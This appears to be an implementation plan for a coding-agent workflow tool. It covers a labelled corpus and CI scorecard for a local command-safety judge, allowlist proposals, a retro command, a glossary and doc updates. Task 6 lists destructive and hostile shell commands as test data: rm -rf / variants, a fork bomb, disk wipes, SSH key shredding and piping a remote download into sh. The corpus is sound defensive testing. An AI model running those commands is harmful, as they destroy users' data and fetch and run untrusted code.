## Task 6: Local judge scorecard

Goal: a labelled corpus under `reference/judge-corpus/` scored by `tools/judge_score.py` (missed dangerous, needless asks, latency); CI fails when missed-dangerous rises above the committed baseline; a generated `SCORECARD.md` holds the numbers the README publishes.
Scope:
- reference/judge-corpus/**
- tools/judge_score.py
- install/tests/test_judge_scorecard.py
Done:
- `python3 -m pytest -q install/tests/test_judge_scorecard.py` passes
- `python3 tools/judge_score.py --check` exits 0
Failing test first: install/tests/test_judge_scorecard.py :: ScorecardTest :: test_no_more_missed_dangerous_than_baseline

**Interfaces:**
- Consumes: `local_judge.gate_answers(tool: str, command: str = "", risky: bool = True) -> {"decision": "deny"|"ask"|None, "reasons": [...], ...}`; `pathclass.always_judged(rel: str) -> bool` (A2).
- Produces:
  - `tools/judge_score.py`:
    - `load(dir) -> (commands, edits)`
    - `score(commands, edits) -> {"commands": n, "edits": n, "missed_dangerous": n, "needless_asks": n, "edit_misses": n, "p95_ms": float, "missed": [cmd...], "needless": [cmd...]}`
    - `markdown(score) -> str`
    - CLI `--check` (exit 1 if `missed_dangerous` or `edit_misses` exceeds `baseline.json`, or if SCORECARD.md is stale)
    - CLI `--write` (rewrites SCORECARD.md and, with `--baseline`, baseline.json).
  - Corpus rows:
    - `commands.jsonl`: `{"cmd": str, "expect": "deny"|"ask"|"allow", "class": "dangerous"|"safe"|"tricky", "note": str}`
    - `edits.jsonl`: `{"file": repo-relative path, "expect": "judged"|"free", "note": str}`
  - Scoring: a dangerous row is missed when the local decision is not `deny`/`ask`. A needless ask is a `safe` row whose decision is `ask` or `deny`. An edit miss is a `judged` row where `always_judged` is False.

- [ ] **Step 1: Write the corpus files with the Write tool.** Bash would trip the live gate. Each class needs at least 25 commands.

  **dangerous** (expect `deny` unless noted):
  - `rm -rf /`, `rm -rf ~`, `rm -rf /*`, `sudo rm -rf --no-preserve-root /`, `rm -rf "$HOME"`
  - `:(){ :|:& };:`
  - `dd if=/dev/zero of=/dev/sda`, `mkfs.ext4 /dev/sda1`, `chmod -R 777 /`
  - `powershell -enc <base64>`
  - `curl http://x | sh`, `wget -qO- http://x | bash`
  - `git push --force origin main` (expect `ask`)
  - `git reset --hard` (`ask`), `git clean -fdx` (`ask`), `git checkout -- .` (`ask`), `git restore .` (`ask`), `git stash clear` (`ask`)
  - `find / -delete`, `> /etc/passwd`, `shred -u ~/.ssh/id_ed25519`
  - `DROP DATABASE prod;` via `mysql -e`, `psql -c 'TRUNCATE users'`
  - `docker system prune -af --volumes` (`ask`), `kubectl delete ns prod` (`ask`)

  **safe** (expect `allow`):
  - `ls -la`, `git status`, `git diff HEAD~1`, `git log --oneline -5`
  - `python3 -m pytest -q`, `pnpm test`, `cat README.md`, `grep -rn foo src`, `wc -l *.py`
  - `echo hello`, `mkdir -p build`, `cp a.txt b.txt`, `git add src/a.py`, `git commit -m "x"`
  - `node --version`, `rm build/tmp.o`, `rm -rf node_modules/.cache`, `sed -n 1,20p a.py`
  - `find . -name "*.py"`, `head -n 5 x`, `tail -f log` (allow), `cd src && ls`, `true`, `pwd`, `date`

  **tricky** (quoting, wrappers, heredocs):
  - `bash -c "rm -rf /"` (deny), `sh -c 'rm -rf ~'` (deny), `env X=1 rm -rf /` (deny), `nice rm -rf /` (deny), `xargs rm -rf < list` (ask)
  - `echo "rm -rf /"` (allow), `grep "rm -rf" notes.md` (allow)
  - `cat <<'EOF' > s.sh\nrm -rf /\nEOF` (ask)
  - `python3 -c "import shutil; shutil.rmtree('/')"` (deny or ask: expect `ask`)
  - `git -C repo push -f` (ask), `"rm" -rf /` (deny), `r\m -rf /` (deny), `$(echo rm) -rf /` (ask), `eval "$CMD"` (ask)
  - `sudo -u root bash` (ask), `ssh host 'rm -rf /'` (ask)
  - `find . -name x -exec rm {} \;` (ask), `time rm -rf /` (deny), `command rm -rf /` (deny), `rm -r -f /` (deny)
  - `rm -fr /` (deny), `rm --recursive --force /` (deny), `git branch -D main` (ask), `git push origin :main` (ask)

  `expect` is what the command **should** get, not what the judge says today. Disagreements are the point: `baseline.json` records today's misses, and the gate only stops regression.

  **edits** (at least 20):
  - `judged`: `.github/workflows/ci.yml`, `.env`, `.env.production`, `package.json`, `pyproject.toml`, `Dockerfile`, `id_rsa`, `config/secrets.yaml`, `.ssh/config`, `install/install.sh`, `Makefile`, `requirements.txt`, `.npmrc`
  - `free`: `src/app.py`, `README.md`, `docs/guide.md`, `tests/test_app.py`, `src/components/Button.tsx`, `notes.txt`

  Every expectation for an edit must match what `pathclass.always_judged` is meant to cover. Where a file is not in A2's class list, mark it `free`, and note in `note` why it might deserve `judged` later.
- [ ] **Step 2: Write the failing test** `install/tests/test_judge_scorecard.py`:

```python
import json
import subprocess
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))
import judge_score

CORPUS = ROOT / "reference" / "judge-corpus"


class ScorecardTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.cmds, cls.edits = judge_score.load(CORPUS)
        cls.s = judge_score.score(cls.cmds, cls.edits)
        cls.base = json.loads((CORPUS / "baseline.json").read_text(encoding="utf-8"))

    def test_corpus_shape(self):
        for c in ("dangerous", "safe", "tricky"):
            self.assertGreaterEqual(sum(1 for r in self.cmds if r["class"] == c), 25, c)
        self.assertGreaterEqual(len(self.edits), 20)
        for r in self.cmds:
            self.assertIn(r["expect"], ("deny", "ask", "allow"))

    def test_no_more_missed_dangerous_than_baseline(self):
        self.assertLessEqual(self.s["missed_dangerous"], self.base["missed_dangerous"], self.s["missed"])
        self.assertLessEqual(self.s["edit_misses"], self.base["edit_misses"])

    def test_scorecard_is_current(self):
        self.assertEqual((CORPUS / "SCORECARD.md").read_text(encoding="utf-8"), judge_score.markdown(self.s))

    def test_check_cli(self):
        p = subprocess.run([sys.executable, str(ROOT / "tools" / "judge_score.py"), "--check"], capture_output=True,
                           text=True)
        self.assertEqual(p.returncode, 0, p.stdout + p.stderr)
```

  `markdown()` must not include latency: it varies by machine, so it would make `test_scorecard_is_current` flaky. Latency is printed by the CLI only, and `p95_ms` is reported, not gated.
- [ ] **Step 3: Run** → FAIL (no `judge_score`).
- [ ] **Step 4: Write `tools/judge_score.py`.** Load both JSONL files, ignoring blank lines. Add `claude/jev` to `sys.path` and import `local_judge` and `pathclass`. Time each `gate_answers("Bash", cmd, True)` with `time.perf_counter()`.
  - A `decision` of `None` maps to `allow`.
  - Dangerous and tricky rows expecting `deny` or `ask` count as missed when the result is `allow`.
  - Safe rows count as needless when the result is not `allow`.
  - `p95_ms` is the 95th-percentile per-command time in milliseconds.

  `markdown(s)` returns exactly:

```python
def markdown(s):
    return ("# Local judge scorecard\n\nGenerated by `python3 tools/judge_score.py --write`; checked in CI.\n\n"
            "| Measure | Value |\n|---|---|\n"
            "| Commands in corpus | %d |\n| Edits in corpus | %d |\n| Missed dangerous commands | %d |\n"
            "| Needless asks on safe commands | %d |\n| Always-judged files not judged | %d |\n"
            % (s["commands"], s["edits"], s["missed_dangerous"], s["needless_asks"], s["edit_misses"]))
```

  `--write` rewrites SCORECARD.md. `--write --baseline` also writes `{"missed_dangerous": n, "edit_misses": n, "needless_asks": n}` to baseline.json. `--check` compares against the baseline and SCORECARD.md and prints the missed commands.
- [ ] **Step 5:** Run `python3 tools/judge_score.py --write --baseline`, then run the test → PASS. Look at the `missed` list. If a dangerous row is missed, leave it: it is the first input for the rule-improvement loop. Copy it into the commit body.
- [ ] **Step 6: Commit** `git add reference/judge-corpus tools/judge_score.py install/tests/test_judge_scorecard.py` and `git commit -m "feat(judge): labelled corpus and a CI scorecard for the local judge"`.

---

## Task 7: `/tune` for keyless users — shadow disagreements and allowlist proposals

Goal: `/tune` lists where the deciding judge and its shadow disagree (redacted minimal patterns, never file contents) as corpus candidates, and proposes `gate.allowlist` additions from the user's own approved local asks; `/tune apply` refuses dangerous allowlist entries.
Scope:
- claude/jev/tune_judge.py
- claude/jev/gate_outcome.py
- claude/jev/gate.py
- claude/jev/thresholds.py
- claude/jev/thresholds.json
- claude/jev/chain.json
- claude/jev/tune.py
- claude/commands/tune.md
- codex/skills/tune/SKILL.md
- claude/jev/tests/test_tune_judge.py
- claude/jev/tests/test_gate_outcome.py
- codex/jev/**
Done:
- `python3 -m pytest -q claude/jev/tests install/tests/test_inventory.py install/tests/test_portability.py` passes
- `python3 tools/sync_codex_plugin.py --check` exits 0; `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: claude/jev/tests/test_tune_judge.py :: ProposalTest :: test_dangerous_prefix_never_proposed

**Interfaces:**
- Consumes:
  - `gate.jsonl` records: `tool`, `head` (Bash only), `decision`, `provider`, and the shadow fields `shadow_provider`, `shadow_decision`.
  - `redact.redact(text) -> str`, `local_judge.danger(cmd)`, `local_judge.destructive(cmd)`.
  - `tune.build` / `tune.render` / `tune.proposals`; `thresholds.validate(dotted, value) -> Optional[str]`.
  - The `post` observe kind (Task 1).
- Produces:
  - `gate.py` adds `tool_use_id` (string, from the hook event, absent when missing) to the `base` dict, so every gate record carries it.
  - `gate_outcome.py` is the stage `gate-outcome` (component `core`, kind `post`, match `Bash`, observe, timeout 2). It appends `jevlog.append("outcomes", dict(tool_use_id=..., tool="Bash"))` and exits 0.
  - `thresholds.DEFAULTS["gate"]["allowlist_min_approvals"] = 3`. `thresholds.validate("gate.allowlist", v)` returns an error string when `local_judge.danger(entry)` or `local_judge.destructive(entry)` returns a name (both return `Optional[str]`) for any entry.
  - `tune_judge.pattern(rec: dict) -> str`: a Bash record gives `redact.redact(rec["head"])`, capped at 80 chars. Any other record gives `rec["tool"]` plus `:` plus the file suffix of `rec["rel"]` (A2: a worktree-relative string, or a list of at most 16 whose first item is used; `<outside>` stays as is) when present. Gate records never carry absolute paths.
  - `tune_judge.disagreements(gate_rows) -> List[dict]`: items `{"pattern", "decision", "shadow_decision", "provider", "shadow_provider", "count"}`, sorted by count descending, top 10. `none` and `skipped` decisions both count as `allow`.
  - `tune_judge.approved_asks(gate_rows, outcome_rows) -> Dict[str, int]`: pattern → count of local `ask` decisions whose `tool_use_id` ran.
  - `tune_judge.allowlist_proposal(approved, current: List[str], min_approvals: int) -> Optional[dict]`: a `{"key": "gate.allowlist", "old": current, "new": current + additions, "why": ...}` proposal or None. A candidate needs `count >= min_approvals`, must not already be covered by `current`, and must have `local_judge.danger(c)` and `local_judge.destructive(c)` both None.
  - `tune_judge.lines(rep) -> List[str]` with labels `- Judge disagreements (deciding vs shadow): N patterns` and `- Approved local asks: N (M patterns)`, then a `CORPUS_CANDIDATES_JSON: [...]` line.

- [ ] **Step 1: Write the failing tests.** `claude/jev/tests/test_tune_judge.py`:

```python
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import thresholds
import tune_judge

G = lambda **k: dict({"tool": "Bash", "provider": "jev", "decision": "none"}, **k)


class DisagreementTest(unittest.TestCase):
    def test_counts_only_real_disagreements(self):
        rows = [G(head="make deploy", decision="ask", shadow_provider="local", shadow_decision="none"),
                G(head="make deploy", decision="ask", shadow_provider="local", shadow_decision="none"),
                G(head="ls", decision="none", shadow_provider="local", shadow_decision="none"),
                G(head="ls", decision="skipped"),
                G(head="git push", decision="deny", shadow_provider="local", shadow_decision="ask")]
        d = tune_judge.disagreements(rows)
        self.assertEqual([(x["pattern"], x["count"]) for x in d], [("make deploy", 2), ("git push", 1)])

    def test_disagreement_patterns_are_redacted(self):
        rows = [G(head="mysql -pS3cretPassw0rd", decision="deny", shadow_provider="local", shadow_decision="none")]
        self.assertNotIn("S3cretPassw0rd", repr(tune_judge.disagreements(rows)))


class ProposalTest(unittest.TestCase):
    def rows(self, head, n, ids_ran=True):
        g = [G(head=head, provider="local", decision="ask", tool_use_id="%s-%d" % (head, i)) for i in range(n)]
        o = [{"tool_use_id": r["tool_use_id"], "tool": "Bash"} for r in g] if ids_ran else []
        return g, o

    def test_repeated_approvals_become_a_proposal(self):
        g, o = self.rows("make build", 3)
        p = tune_judge.allowlist_proposal(tune_judge.approved_asks(g, o), ["ls"], 3)
        self.assertEqual(p["new"], ["ls", "make build"])

    def test_unapproved_asks_do_not_count(self):
        g, o = self.rows("make build", 5, ids_ran=False)
        self.assertIsNone(tune_judge.allowlist_proposal(tune_judge.approved_asks(g, o), [], 3))

    def test_dangerous_prefix_never_proposed(self):
        g1, o1 = self.rows("rm -rf", 9)
        g2, o2 = self.rows("git push --force", 9)
        approved = tune_judge.approved_asks(g1 + g2, o1 + o2)
        self.assertIsNone(tune_judge.allowlist_proposal(approved, [], 3))

    def test_apply_refuses_dangerous_allowlist_entry(self):
        self.assertIsNotNone(thresholds.validate("gate.allowlist", ["ls", "rm -rf"]))
        self.assertIsNone(thresholds.validate("gate.allowlist", ["ls", "make build"]))
```

  `claude/jev/tests/test_gate_outcome.py` runs `gate_outcome.py` as a subprocess with `JEV_LOG_DIR` set to a temp dir (use the same env var that `test_jevlog.py` uses).
  - Given `{"tool_name": "Bash", "tool_use_id": "t1"}`, it writes one `outcomes.jsonl` line containing `"tool_use_id": "t1"`.
  - Given no id, it writes nothing.
  - Given non-JSON stdin, it exits 0.
  - A gate test checks that `gate.run({"tool_name": "Bash", "tool_use_id": "t9", "tool_input": {"command": "ls"}})` logs a record with `tool_use_id == "t9"`. Assert it through the log file the same way `test_gate.py` reads records.
- [ ] **Step 2: Run** → FAIL.
- [ ] **Step 3: Implement.**
  - **`gate_outcome.py`:** about 25 lines. Read stdin (cap 1 MiB). If the event is a dict with a string `tool_use_id`, append the outcome. Catch everything and exit 0.
  - **`gate.py`:** in `run()`, where `base` is built, add `**({"tool_use_id": str(event["tool_use_id"])[:64]} if isinstance(event.get("tool_use_id"), str) else {})`. Use whatever name the event dict has in `run()`.
  - **`chain.json`:** add to `post`, after `mem-edit`: `{"name": "gate-outcome", "harness": ["claude", "codex"], "component": "core", "cmd": ["$PY", "-X", "utf8", "$CD/jev/gate_outcome.py"], "match": "Bash", "timeout": 2, "observe": true}`. Codex has no PostToolUse route in this plan, so on Codex it never fires; the harness list is still kept for the day it does.
  - **`thresholds.py`:** add `"allowlist_min_approvals": 3` to `DEFAULTS["gate"]` (also in the shipped `thresholds.json` if it lists gate keys). In `validate`, after the type check, for `dotted == "gate.allowlist"`, import `local_judge` lazily and return `"refused: %r matches a dangerous or destructive pattern" % e` for the first offending entry.
  - **`tune_judge.py`:** implement as specified. The coverage test for `current` reuses `gate.allowlisted(candidate, current)`, which is its prefix-word rule.
  - **`tune.py`:**
    - `build()` adds `"judge": {"disagreements": tune_judge.disagreements(gate), "approved": tune_judge.approved_asks(gate, read("outcomes"))}`.
    - `render()` adds `lines += tune_judge.lines(rep["judge"])` before the proposals header.
    - `proposals()` appends the result of `tune_judge.allowlist_proposal(rep["judge"]["approved"], th["gate"]["allowlist"], th["gate"]["allowlist_min_approvals"])` when it is not None.
- [ ] **Step 4: Command text.** In `claude/commands/tune.md`, add a paragraph to the report-reading instructions, verbatim:

  > **Judge disagreements.** `CORPUS_CANDIDATES_JSON` lists commands where the deciding judge and its shadow disagreed (patterns only, redacted). Show them to the user. For each one the user accepts, add a row to `reference/judge-corpus/commands.jsonl` in the dryas-workflow repo with the verdict the user says is right, and a local-judge rule change in a plan. Never paste file contents.
  >
  > **Allowlist.** A `gate.allowlist` proposal comes from local asks this user approved at least `gate.allowlist_min_approvals` times. Apply it only after the user approves (`tune.py apply gate.allowlist '<json>'`). Dangerous or destructive entries are refused.

  Mirror the paragraph in `codex/skills/tune/SKILL.md`, using the Codex wording for the command (`$dryas:tune`).
- [ ] **Step 5: Run** the sync, then everything in Done.
- [ ] **Step 6: Commit** the Scope paths and `git commit -m "feat(tune): judge disagreements as corpus candidates and allowlist proposals from approved asks"`.

---

## Task 8: Lines per task in `/tune`

Goal: the `log_dispatch` return record accepts `lines` (added + deleted lines of the task's commit); `/tune` reports the median lines per task overall and per start tier (Ponytail lesson: smaller diffs per task are the target).
Scope:
- claude/jev/jev_mcp.py
- claude/jev/tune_tasks.py
- claude/jev/tests/test_tune_lines.py
- codex/jev/**
Done:
- `python3 -m pytest -q claude/jev/tests install/tests/test_inventory.py` passes
- `python3 tools/sync_codex_plugin.py --check` exits 0; `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: claude/jev/tests/test_tune_lines.py :: LinesTest :: test_median_lines_per_task_and_per_tier

**Interfaces:**
- Consumes (A2): `jev_mcp._dispatch_extras` (optional return-record fields), `tune_tasks._row` (row dict, keys incl. `start_tier`), `tune_tasks.summary(task_rows, gate, review, ..., th)` (A2 fix 16 added `gate`, `review` and `th`; call it with the merged signature, as `tune.build` does), `tune_tasks.lines(summary)`. Read A2's `tune_tasks.py` first: if the names differ after A2's cleanup, use the merged names, keep this task's behaviour, and note the names in the commit body.
- Produces: `log_dispatch` accepts `lines` (int 0–1,000,000; other values dropped, never an error). Rows carry `lines` (None when unknown). `summary` carries `lines_median` (`float` or None) and `lines_by_tier` (`{tier: median}`). `lines()` emits `- Lines changed per task (median): N` and `- Lines per task by start tier: fast N, standard N, strong N, frontier N` (missing tiers omitted; `n/a` when none).

- [ ] **Step 1: Write the failing test.** Build two dispatch records per task: a dispatch-time record with `task`, `tier` and `role`, and a `phase: "return"` record with `lines`. Copy the shapes from A2's `test_tune_baseline.py` / `tune_tasks` tests. Feed them through `tune_tasks.rows(...)` and `summary(...)`, then assert:
  - with lines 10, 30, 50 on fast and 200 on strong: `lines_median == 40.0`, `lines_by_tier == {"fast": 30.0, "strong": 200.0}`;
  - the rendered lines include `- Lines changed per task (median): 40`;
  - a return record with `lines: "x"` gives a row with `lines is None`.

  Also add an MCP test: `jev_mcp.handle` with a `tools/call` of `log_dispatch` and `{"phase": "return", "lines": 12, ...}` writes `lines: 12` to `dispatch.jsonl`, and with `lines: -5` writes no `lines`.
- [ ] **Step 2: Run** → FAIL.
- [ ] **Step 3: Implement.**
  - `_dispatch_extras` validates `lines` as a bool-excluded int in range.
  - The `log_dispatch` input schema gains `"lines": {"type": "integer", "minimum": 0}`. The inventory gains an `mcp_param` entry; that is an addition, not a loss.
  - `_row` copies `lines` from the return record.
  - `summary` computes the medians with `statistics.median`.
  - `lines` adds the two lines after the existing per-task lines.
- [ ] **Step 4: Run** the sync and Done.
- [ ] **Step 5: Commit** `git add claude/jev/jev_mcp.py claude/jev/tune_tasks.py claude/jev/tests/test_tune_lines.py codex/jev` and `git commit -m "feat(tune): lines changed per task, overall and by start tier"`.

---

## Task 9: `/retro`, `GLOSSARY.md` and `.out-of-scope/`

Goal: a user-invoked `/retro` command (Claude) and `$dryas:retro` skill (Codex) that proposes environment improvements by severity and stores accepted lessons as memory kind `retro`; a root `GLOSSARY.md` with one line per Dryas term; `.out-of-scope/` with the four decided non-goals.
Scope:
- claude/commands/retro.md
- codex/skills/retro/**
- GLOSSARY.md
- .out-of-scope/**
- tools/sync_codex_plugin.py
- install/tests/test_retro_glossary.py
Done:
- `python3 -m pytest -q install/tests` passes
- `python3 tools/sync_codex_plugin.py --check` exits 0; `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: install/tests/test_retro_glossary.py :: RetroTest :: test_retro_command_shape

**Interfaces:**
- Consumes: `memory_store` with `kind: "retro"` (`memstore.STORE_KINDS` already includes `"retro"`); `tools/sync_codex_plugin.COMMANDS`.
- Produces:
  - `/retro` (`claude/commands/retro.md`, front matter `disable-model-invocation: true`).
  - Codex `$dryas:retro` (`codex/skills/retro/SKILL.md` + `agents/openai.yaml` with `allow_implicit_invocation: false`).
  - `"retro"` added to `COMMANDS` in `tools/sync_codex_plugin.py`.
  - `GLOSSARY.md` with `## Terms` and lines of the form `- **term**: definition.`
  - `.out-of-scope/<slug>.md`, each with the lines `Date:`, `Decision:` and `Reason:`.

- [ ] **Step 1: Write the failing test** `install/tests/test_retro_glossary.py`:

```python
import re
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
TERMS = ("Jev", "judge", "provider", "shadow", "fallback", "tier", "rung", "ladder", "scope lock", "worktree loop",
         "task id", "baseline", "inventory", "extra")
CATEGORIES = ("navigation", "automated checks", "instruction lines", "tool cost", "information access")


class RetroTest(unittest.TestCase):
    def test_retro_command_shape(self):
        s = (ROOT / "claude/commands/retro.md").read_text(encoding="utf-8")
        self.assertIn("disable-model-invocation: true", s)
        for c in CATEGORIES:
            self.assertIn(c, s.lower())
        self.assertIn("memory_store", s)
        self.assertIn('kind "retro"', s)
        self.assertIn("proposes, never applies", s.lower())
        cx = (ROOT / "codex/skills/retro/SKILL.md").read_text(encoding="utf-8")
        self.assertIn("memory_store", cx)
        y = (ROOT / "codex/skills/retro/agents/openai.yaml").read_text(encoding="utf-8")
        self.assertIn("allow_implicit_invocation: false", y)

    def test_glossary_terms(self):
        g = (ROOT / "GLOSSARY.md").read_text(encoding="utf-8")
        for t in TERMS:
            self.assertRegex(g, r"(?im)^- \*\*%s\*\*: \S" % re.escape(t), t)

    def test_out_of_scope_entries(self):
        d = ROOT / ".out-of-scope"
        names = sorted(p.stem for p in d.glob("*.md"))
        self.assertEqual(names, ["embeddings-in-memory", "rebuild-ruflo-tools", "replace-design-plugins", "rust-core"])
        for p in d.glob("*.md"):
            s = p.read_text(encoding="utf-8")
            for k in ("Date: 2026-10-14", "Decision:", "Reason:"):
                self.assertIn(k, s, p.name)
```

- [ ] **Step 2: Run** → FAIL.
- [ ] **Step 3: Write `claude/commands/retro.md`.** Front matter: `description: Session retrospective — propose environment improvements by severity; proposes, never applies` and `disable-model-invocation: true`. Body (write it out in full):
  1. **Input.** The current session, or a named session/transcript path in `$ARGUMENTS`.
  2. **Read** the transcript for friction, in these categories:
     - **navigation**: files or facts the agent struggled to find;
     - **automated checks**: mistakes a test, lint or hook could have caught;
     - **instruction lines** that changed nothing;
     - **tool cost**: slow or expensive calls and repeated reads;
     - **information access**: missing docs, credentials or tools.
  3. **Output** one list ordered by severity. Each item gives: category, evidence (a quote or file:line), proposed change, and kind. Kind is `check` when the rule is mechanical (model: the scope lock, `tools/inventory.py`) and `prose` only for a judgement call.
  4. **The rule:** a mechanical rule becomes a deterministic check, and only judgement calls stay as prose.
  5. **Proposes, never applies.** Ask which items the user accepts. Accepted items go into a plan (`/wplan`), not into edits now.
  6. **Store** each accepted lesson with `mcp__plugin_dryas_jev__memory_store`, kind "retro", title = the lesson in one line, body = evidence and the agreed change. `memory_search` surfaces it before the next task.
  7. **Point to `GLOSSARY.md`** for terms.

  Write the Codex skill with the same content in Codex names (`memory_store` on server `jev`, `$dryas:wplan`). Add `agents/openai.yaml` matching the other user-invoked Codex skills: copy `codex/skills/tune/agents/openai.yaml` and change the name and description.
- [ ] **Step 4: Write `GLOSSARY.md`.**
  - Title `# Glossary`, then one sentence: "One word per meaning; skills, templates and docs point here instead of re-explaining."
  - Then `## Terms`, one line per term in `TERMS`, plus `local judge`, `Dryas memory`, `observe stage` and `corpus`. Definitions:
    - **Jev**: the judge layer; answers narrow typed questions (gates, routing), never writes code or plans; provider local or the Jev model.
    - **judge**: the function behind every Jev question, `judge(question, state)`.
    - **provider**: who fills a slot (judge local|jev, memory dryas|ruflo|none, process dryas|superpowers).
    - **shadow**: a second provider whose answer is logged next to the deciding one, never acted on.
    - **fallback**: the local answer used when the Jev model is unavailable, recorded as such.
    - **tier**: fast, standard, strong, frontier.
    - **rung**: one step of the ladder.
    - **ladder**: fast → standard → strong → frontier, climbed only on failure.
    - **scope lock**: the hook that denies edits outside a task's Scope globs.
    - **worktree loop**: one task, one worktree, one agent.
    - **task id**: the id on every gate, dispatch, review and merge record.
    - **baseline**: the window `/tune` compares a switch against.
    - **inventory**: the 1.x no-loss snapshot checked by `tools/inventory.py`.
    - **extra**: an optional third-party component (Ruflo, Superpowers, the design plugins).
    - **local judge**: deterministic rules, no network.
    - **Dryas memory**: the SQLite store at `~/.dryas/dryas.db`.
    - **observe stage**: a hook stage whose output is ignored.
    - **corpus**: the labelled judge cases in `reference/judge-corpus/`.
- [ ] **Step 5: Write `.out-of-scope/`.** Four files, each three lines plus a title:
  - `rust-core.md`: Decision: no Rust or compiled core; Reason: a toolchain or signed binaries would reintroduce a dependency; contracts stay language-neutral so a hot-path binary stays possible later.
  - `embeddings-in-memory.md`: Decision: deferred; Reason: full-text recall first; Ruflo embeddings are kept as blobs for a later semantic provider.
  - `rebuild-ruflo-tools.md`: Decision: Ruflo tools no rule or hook calls are not rebuilt; Reason: nothing in the loop uses them, and they stay available with `--with-ruflo`.
  - `replace-design-plugins.md`: Decision: the design plugins stay third-party and installed by default; Reason: no owned equivalent is planned.
- [ ] **Step 6:** Add `"retro"` to `COMMANDS` in `tools/sync_codex_plugin.py`. Run `--check`, then Done. The inventory gains `command:claude:retro` as an addition.
- [ ] **Step 7: Commit** the Scope paths and `git commit -m "feat: /retro, GLOSSARY.md and .out-of-scope decisions"`.

---

## Task 10: Mechanics docs for the owned core

Goal: every doc that describes how Dryas works states the owned core as merged: providers, Dryas memory, Dryas skills, memory stages, the installer flags, the cut-over, Codex conformance, and plainly what the keyless setup means.
Scope:
- docs/workflow.md
- docs/architecture.md
- docs/memory-model.md
- docs/governance.md
- docs/install.md
- docs/harnesses.md
- docs/roles.md
- docs/execution-model.md
- docs/review-model.md
- docs/release-check.md
- docs/roadmap.md
- CONTRIBUTING.md
- install/tests/test_owned_core_docs.py
Done:
- `python3 -m pytest -q install/tests` passes
- `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: install/tests/test_owned_core_docs.py :: DocsTest :: test_no_stale_requirement_claims

**Interfaces:**
- Consumes: the merged behaviour of Tasks 1–9 (flags, stages, tools, commands). Read the code before writing each claim: every claim must match merged code.
- Produces: `install/tests/test_owned_core_docs.py`, which Task 11 extends with README and reference files.

- [ ] **Step 1: Write the failing test** `install/tests/test_owned_core_docs.py`:

```python
import re
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
DOCS = ["docs/workflow.md", "docs/architecture.md", "docs/memory-model.md", "docs/governance.md", "docs/install.md",
        "docs/harnesses.md", "docs/roles.md", "docs/execution-model.md", "docs/review-model.md",
        "docs/release-check.md", "docs/roadmap.md", "CONTRIBUTING.md"]
STALE = [r"the \*\*only\*\* memory", r"only memory/learning layer", r"Superpowers\*\* \(plugin\) \| Process",
         r"required by the plugin", r"required dependency", r"superpowers:[a-z]", r"Ruflo is the memory",
         r"installs Superpowers as a dependency", r"searches Ruflo memory", r"stored in Ruflo memory",
         r"Node is used only for the Ruflo MCP shim"]
FILES = DOCS  # Task 11 appends README.md, reference/README.md, docs/why-dryas.md


class DocsTest(unittest.TestCase):
    def text(self, p):
        return (ROOT / p).read_text(encoding="utf-8")

    def test_no_stale_requirement_claims(self):
        for p in FILES:
            t = self.text(p)
            for pat in STALE:
                self.assertIsNone(re.search(pat, t), "%s: %s" % (p, pat))

    def test_required_facts(self):
        need = {
            "docs/install.md": ["--judge local", "--with-ruflo", "--with-superpowers", "--with-design", "--memory",
                                "dryas memory import-ruflo", "Node"],
            "docs/workflow.md": ["mem-edit", "mem-session-end", "memory_search", "dryas:brainstorm", "/retro",
                                 "fast → standard → strong → frontier"],
            "docs/memory-model.md": ["dryas.db", "FTS5", "PageRank", "include_archive", "dryas memory consolidate"],
            "docs/governance.md": ["Judge providers", "deterministic rules", "judge-corpus"],
            "docs/harnesses.md": ["mem-session-start", "memory_search"],
            "docs/roadmap.md": ["owned core"],
        }
        for p, needles in need.items():
            t = self.text(p)
            for n in needles:
                self.assertIn(n, t, "%s lacks %r" % (p, n))
```

- [ ] **Step 2: Run** → FAIL.
- [ ] **Step 3: Rewrite**, file by file. Use the docs-agent findings (`file:line` lists) recorded in the plan's handoff notes below, and grep each file for `Ruflo`, `Superpowers`, `superpowers:` and `Node` first.
  - **`docs/workflow.md`.**
    - §layers table (:35–36): Dryas memory is the memory/learning layer; Dryas skills are process; Ruflo and Superpowers are optional extras with one line each.
    - Skill names: `superpowers:brainstorming` → `dryas:brainstorm`, `using-git-worktrees` → `dryas:worktree`, `verification-before-completion` → `dryas:verify`, and the others per C's table.
    - :77, :102, :106: Dryas memory (`memory_search`, `swarm_init` ledger, `memory_store`).
    - Hooks section: the memory stages with their events, observe-only, 2 s; `gate-outcome`.
    - §7 Ruflo becomes "Optional extra: Ruflo".
    - §8 Superpowers becomes "Optional extra: Superpowers". Keep the deny list explanation.
    - Commands table: add `/retro`.
    - Paths and outages (:258–303): add the Dryas memory DB, locked or missing → degraded, hooks exit 0.
    - The allow-list sentence (:171): memory tools are on the `jev` server, covered by its allow rule.
  - **`docs/architecture.md`:** the memory row describes `~/.dryas/dryas.db` with its tables, and the component table gains the `memory` component.
  - **`docs/memory-model.md`:** replace :34 with a "Dryas memory" section:
    - store, tables, FTS5 or LIKE, namespaces, MEM-4 write checks, ranking with reason strings, archive kind and `include_archive`;
    - consolidation in hooks and in the background (`dryas memory consolidate`, lock, retry at session start, `/tune` counts);
    - migration (`dryas memory import-ruflo`, idempotent, `~/.dryas/ruflo` left in place).
    - Ruflo memory remains as the `--memory ruflo` provider.
  - **`docs/governance.md` § Judge providers:** add three paragraphs.
    - Without a key the safety checks are **deterministic rules** (the local judge), and planning questions go to the user's own strong tier on their subscription. Jev is the upgrade for unclear cases.
    - The scorecard (`reference/judge-corpus/`, CI, numbers in the README).
    - The improvement loop: shadow disagreements become corpus candidates in `/tune`, and allowlist proposals come from approved asks, applied only with `/tune apply`.
  - **`docs/install.md`:**
    - New flags table: `--judge`, `--memory`, `--with-ruflo`, `--with-superpowers`, `--with-design`, `--no-memory`, and the aliases with their 2.0 meaning.
    - Fresh versus upgrade defaults.
    - Preflight: Python 3.9+; Node, npm and the spaces check only with Ruflo.
